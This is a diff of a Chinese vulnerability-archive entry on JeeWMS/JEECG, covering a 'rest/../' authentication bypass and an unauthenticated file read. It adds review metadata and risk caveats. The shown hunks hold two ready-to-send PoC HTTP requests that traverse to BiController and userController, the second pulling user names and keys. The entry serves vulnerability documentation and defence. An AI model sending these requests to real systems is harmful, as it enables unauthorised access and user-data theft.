@@ -1,11 +1,51 @@
 ---
-fofa: "语句：body="
 source: "MrWQ/vulnerability-paper"
+title: "JeeWMS/JEECG组件 rest路径鉴权绕过及showOrDownByurl读取"
+product: "JeeWMS/JEECG组件"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "全版本无依据；context-path与路径归一化条件"
+prerequisites: "前台绕过声明"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/ylOuWc8elD2EtM-1LiJp9g"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/JEEWMS/JEEWMS%20%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md"
+fofa_unverified: "语句：body="
+id: "vw-1f2c4e2627f282c170781526"
+entity_id: "ve-1f2c4e2627f282c170781526"
+schema_version: "1"
 ---
 
-# JEEWMS 仓库管理系统存在权限绕过漏洞和未授权任意文件读取
+# JeeWMS/JEECG组件 rest路径鉴权绕过及showOrDownByurl读取
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：JeeWMS/JEECG组件；rest路径鉴权绕过及showOrDownByurl读取
+- 版本、配置及部署条件：全版本无依据；context-path与路径归一化条件
+- 认证与权限前提：前台绕过声明
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 双漏洞分实体；鉴权绕过可关联86–90但不把SQLi全部视同根因
+- 公开测试域/会话及用户字段应示例化，需客户端原样路径说明
+- 系统配置根+dbPath有清晰读取思路，具体代码仅图；无修复版本
+- FOFA元数据残缺、去站点推广；全版本需固定commit支持
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ylOuWc8elD2EtM-1LiJp9g)
 
 **1、描述**
@@ -91,7 +131,7 @@ jeewms 使用 JAVA 拦截器做的权限控制，存在被绕过漏洞，代码�
 **POC：  
 **
 
-```
+```http
 POST /wmstest/rest/../BiController.do?dayCount&reportType=line HTTP/1.1
 Host: www.jeewms.cn
 Content-Length: 0
@@ -105,10 +145,9 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5
 Connection: close
 ```
 
-```
+```http
 POST /wmstest/rest/../userController.do?datagrid&field=id,userName,realName,userOrgList.tsDepart.departname,userKey,createBy,createDate,updateBy,updateDate,status, HTTP/1.1
 Host: www.jeewms.cn
-Content-Length: 58
 Accept: application/json, text/javascript, */*; q=0.01
 X-Requested-With: XMLHttpRequest
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Edg/85.0.564.63
@@ -121,6 +160,8 @@ Connection: close
 
 page=1&rows=10&sort=createDate%2CuserName&order=asc%2Cdesc
 ```
+
+> 请求长度说明：原资料 Content-Length 为 58；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 二、未授权任意文件读取漏洞  
 
